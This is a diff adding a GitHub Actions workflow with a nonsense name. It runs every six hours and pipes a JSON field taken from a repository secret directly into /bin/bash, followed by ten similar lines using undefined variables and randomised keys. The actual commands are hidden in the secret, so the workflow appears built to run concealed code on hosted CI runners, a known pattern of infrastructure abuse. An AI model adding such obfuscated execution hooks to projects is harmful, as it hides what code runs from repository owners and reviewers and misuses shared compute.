@@ -1,0 +1,26 @@
+name: nixianzaiyouduiyoulema
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nixianzaiyouduiyoulema
+        env:
+          zxytr66628: ${{ secrets.zxytr66628 }}
+        run: |
+          echo $zxytr66628 | jq -r .pgja28654 | /bin/bash
+          echo $fsagm27 | jq -r .gkuhi92293 | /bin/bash
+          echo $thrp70 | jq -r .gavn4439 | /bin/bash
+          echo $eviel5975 | jq -r .pg3143 | /bin/bash
+          echo $o528 | jq -r .wlvdb0 | /bin/bash
+          echo $r1 | jq -r .vbk45626 | /bin/bash
+          echo $euw55884 | jq -r .wh69013 | /bin/bash
+          echo $nko2 | jq -r .sq86952 | /bin/bash
+          echo $phm527 | jq -r .ktovc85031 | /bin/bash
+          echo $ufps3016 | jq -r .pyf826 | /bin/bash
+          echo $mgq02015 | jq -r .sdmuf1 | /bin/bash
+
